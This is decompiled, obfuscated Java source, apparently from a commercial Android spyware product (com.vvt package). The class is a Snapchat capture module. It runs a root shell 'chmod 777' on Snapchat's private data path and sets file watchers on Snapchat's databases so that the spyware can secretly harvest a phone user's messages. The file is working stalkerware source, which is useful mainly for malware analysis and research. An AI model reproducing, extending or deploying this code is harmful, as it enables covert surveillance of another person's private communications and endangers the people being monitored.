package com.vvt.capture.snapchat.b;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.i;
import com.vvt.capture.snapchat.d;
import com.vvt.n.a.g;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.Iterator;
import java.util.List;

public class a
  implements com.vvt.base.capture.e, com.vvt.n.a.a, g
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private i c;
  private com.vvt.n.a.b d;
  private boolean e;
  private boolean f;
  private String g;
  private String h;
  private String i;
  private Context j;
  private RunningMode k;
  private c l;
  private e m;
  private e n;
  private List o;
  private int p;
  
  public a(com.vvt.n.a.b paramb, String paramString1, String paramString2, Context paramContext, String paramString3, RunningMode paramRunningMode)
  {
    this.d = paramb;
    this.g = paramString1;
    this.f = false;
    this.h = paramString2;
    this.j = paramContext;
    this.i = paramString3;
    this.k = paramRunningMode;
  }
  
  private void a(String paramString1, String paramString2)
  {
    e locale = this.m;
    if (locale != null)
    {
      locale = this.m;
      locale.stopWatching();
    }
    locale = new com/vvt/capture/snapchat/b/e;
    locale.<init>(this, paramString1);
    this.m = locale;
    this.m.startWatching();
    locale = this.n;
    if (locale != null)
    {
      locale = this.n;
      locale.stopWatching();
    }
    locale = new com/vvt/capture/snapchat/b/e;
    locale.<init>(this, paramString2);
    this.n = locale;
    this.n.startWatching();
  }
  
  private void d()
  {
    Object localObject = d.a();
    boolean bool1 = a;
    if (bool1) {}
    boolean bool2 = com.vvt.ag.b.a((String)localObject);
    com.vvt.n.a.b localb;
    if (!bool2)
    {
      localObject = this.o;
      if (localObject != null)
      {
        localObject = this.o;
        localIterator = ((List)localObject).iterator();
        for (;;)
        {
          bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject = (String)localIterator.next();
          localb = this.d;
          localb.a((String)localObject);
        }
      }
      bool2 = g();
      this.e = bool2;
      bool2 = this.e;
      if (bool2) {
        e();
      }
      f();
      return;
    }
    localObject = d.f();
    this.o = ((List)localObject);
    localObject = this.o;
    Iterator localIterator = ((List)localObject).iterator();
    for (;;)
    {
      bool2 = localIterator.hasNext();
      if (!bool2) {
        break;
      }
      localObject = (String)localIterator.next();
      localb = this.d;
      localb.a((String)localObject, this);
    }
  }
  
  private void d(String paramString)
  {
    this.d.a(paramString, this);
  }
  
  private void e()
  {
    String str1 = d.a();
    boolean bool = a;
    if (bool) {}
    bool = com.vvt.ag.b.a(str1);
    if (!bool)
    {
      String str2 = this.g;
      String str3 = this.h;
      String str4 = this.i;
      RunningMode localRunningMode = this.k;
      d.a(str1, str2, str3, str4, localRunningMode);
      str2 = d.b();
      str3 = d.c();
      a(str2, str3);
      d(str1);
    }
  }
  
  private void f()
  {
    Object localObject1 = d.e();
    boolean bool1 = com.vvt.ag.b.a((String)localObject1);
    Object localObject2;
    if (!bool1)
    {
      Object[] arrayOfObject = new Object[1];
      arrayOfObject[0] = localObject1;
      localObject2 = String.format("chmod 777 %s", arrayOfObject);
      boolean bool2 = a;
      if (!bool2) {}
    }
    try
    {
      KMShell.a((String)localObject2);
      localObject2 = this.l;
      if (localObject2 == null)
      {
        localObject2 = new com/vvt/capture/snapchat/b/c;
        ((c)localObject2).<init>(this, (String)localObject1);
        this.l = ((c)localObject2);
      }
      localObject1 = this.l;
      ((c)localObject1).startWatching();
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
  }
  
  private boolean g()
  {
    boolean bool1 = false;
    String str1 = null;
    String str2 = d.d();
    boolean bool2 = com.vvt.ag.b.a(str2);
    if (!bool2)
    {
      str1 = this.g;
      String str3 = this.h;
      String str4 = this.i;
      str1 = d.a(str2, str1, str3, str4);
      bool1 = com.vvt.capture.snapchat.b.c(str1);
    }
    return bool1;
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.f;
    if (!bool)
    {
      bool = true;
      this.f = bool;
      this.c = parami;
      d();
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Thread localThread = new java/lang/Thread;
    b localb = new com/vvt/capture/snapchat/b/b;
    localb.<init>(this);
    localThread.<init>(localb);
    localThread.start();
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.f;
    if (bool)
    {
      bool = false;
      this.f = false;
      this.c = null;
      Object localObject1 = this.o;
      if (localObject1 != null)
      {
        localObject1 = this.o;
        localObject2 = ((List)localObject1).iterator();
        for (;;)
        {
          bool = ((Iterator)localObject2).hasNext();
          if (!bool) {
            break;
          }
          localObject1 = (String)((Iterator)localObject2).next();
          com.vvt.n.a.b localb = this.d;
          localb.a((String)localObject1);
        }
      }
      localObject1 = d.a();
      Object localObject2 = this.d;
      ((com.vvt.n.a.b)localObject2).a((String)localObject1);
      localObject1 = this.m;
      if (localObject1 != null)
      {
        localObject1 = this.m;
        ((e)localObject1).stopWatching();
        this.m = null;
      }
      localObject1 = this.n;
      if (localObject1 != null)
      {
        localObject1 = this.n;
        ((e)localObject1).stopWatching();
        this.n = null;
      }
      localObject1 = this.l;
      if (localObject1 != null)
      {
        localObject1 = this.l;
        ((c)localObject1).stopWatching();
        this.l = null;
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    d();
    bool = a;
    if (bool) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */